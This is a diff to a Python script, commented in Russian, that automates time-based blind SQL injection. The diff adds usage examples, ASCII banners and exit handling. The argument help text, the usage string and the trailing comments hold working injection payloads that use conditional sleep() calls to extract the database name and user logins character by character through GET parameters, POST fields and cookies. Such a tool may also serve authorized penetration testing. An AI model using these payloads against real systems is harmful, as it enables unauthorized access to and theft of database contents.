@@ -1,8 +1,9 @@
 from timeit import default_timer as timer  # библиотека измерения времени
 import requests  # библиотека HTTP запросов
 import argparse
+import sys
 
-parser = argparse.ArgumentParser(description='blind sql injection', usage='Script options')
+parser = argparse.ArgumentParser(description='blind sql injection')
 parser.add_argument('-get', help='HTTP GET method. Example: python3 blind_sql.py -get -u "http://example.com:1337?id=1 \
 and (case when ASCII(substring((SELECT database() limit 0,1), {POSITION}, 1))={SYMBOL} THEN sleep(3) END) -- -" ',
                     action="store_true")
@@ -16,12 +17,37 @@ parser.add_argument('-d', '--Data' , action='append', nargs='+',
                     help='Data string to be sent through POST in format kay=value (e.g. -d "id=1337" "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" )')
 parser.add_argument('-H', '--Header', action='append', nargs='+',
                     help='Headers for a POST request (e.g. "-H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}" ")')
+parser.usage= """ Примеры использования:
+
+python3 main.py -get -u "http://192.168.0.1/?id=admin' and (if((substring((SELECT HEX(login) FROM users limit 0,1), {POSITION}, 1)='{SYMBOL}'), sleep(2), 0))#" -v -t HEX -H "Cookie: SessionId=qwerty"
+python3 main.py -post -u "http://192.168.0.1/" -d "id=1337" "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" -v -H "Cookie: SessionId=qwerty" 
+python3 main.py -post -u "http://192.168.0.1/" -d "id=1337" "name=value" -v -H "Cookie: id=qwerty' and (if((substring((SELECT HEX(login) FROM users limit 0,1), {POSITION}, 1)='{SYMBOL}'), sleep(2), 0))#" 
+
+
+"""
 args = parser.parse_args()
 
 
 def greetings():
     """Функция отображает приветствие пользователя"""
-    print('''BLIND SQL INJECTION''')
+    print('=' * 40)
+    print('''
+.______    __       __  .__   __.  _______  
+|   _  \  |  |     |  | |  \ |  | |       \ 
+|  |_)  | |  |     |  | |   \|  | |  .--.  |
+|   _  <  |  |     |  | |  . `  | |  |  |  |
+|  |_)  | |  `----.|  | |  |\   | |  '--'  |
+|______/  |_______||__| |__| \__| |_______/ 
+                                            
+     _______.  ______      __       __  
+    /       | /  __  \    |  |     |  | 
+   |   (----`|  |  |  |   |  |     |  | 
+    \   \    |  |  |  |   |  |     |  | 
+.----)   |   |  `--'  '--.|  `----.|  | 
+|_______/     \_____\_____\_______||__| 
+
+    ''')
+    print('=' * 40)
 
 
 def blind_sql(length_result, delay_time):
@@ -72,20 +98,34 @@ def blind_sql(length_result, delay_time):
 
 
 if __name__ == "__main__":
-    greetings()
-    length_result = int(input('Input length: '))  # Возможная длинна строки
-    delay_time = 2 # если ответ приходит дольше - значит букву угадали
+    try:
+        greetings()
+        length_result = int(input('Input length: '))  # Возможная длинна строки
+        delay_time = 2 # если ответ приходит дольше - значит букву угадали
 
-    if args.URL.upper() == 'HEX':
-        dictionary = list(range(0, 10)) + list(range(ord('A'), ord('F') + 1))
-    else:
-        dictionary = list(range(48, 58)) + list(range(95, 126))  # Список кодов ASCII возможных симолов
-    print(dictionary)
+        if args.URL.upper() == 'HEX':
+            dictionary = list(range(0, 10)) + list(range(ord('A'), ord('F') + 1))
+        else:
+            dictionary = list(range(48, 58)) + list(range(95, 126))  # Список кодов ASCII возможных симолов
+        print(dictionary)
 
-    if not args.get and not args.post:
-        parser.error('Argument not specified. Use -get or -post')
+        if not args.get and not args.post:
+            parser.error('Argument not specified. Use -get or -post')
 
-    blind_sql(length_result, delay_time)
+        blind_sql(length_result, delay_time)
+
+    except KeyboardInterrupt:
+        print("""
+.______   ____    ____  _______ 
+|   _  \  \   \  /   / |   ____|
+|  |_)  |  \   \/   /  |  |__   
+|   _  <    \_    _/   |   __|  
+|  |_)  |     |  |     |  |____ 
+|______/      |__|     |_______|
+
+        """)
+        sys.exit(0)
+
 
 # python3 main.py -post -u "http://192.168.0.1/" -t HEX -H "Content-Type: application/json" -H "Authorization: Bearer token"
 
@@ -93,4 +133,4 @@ if __name__ == "__main__":
 # python3 main.py -post -u "http://192.168.0.1/" -t HEX -d "id=1337" -d "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #"
 
 
-# python3 main.py -post -u "http://192.168.0.1/" --Type HEX -d "id=1337" --Data "name=value" -H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}"
+# python3 main.py -post -u "http://192.168.0.1/" --Type HEX -d "id=1337" --Data "name=value"   -H "Authorization: Bearer token {SYMBOL}"
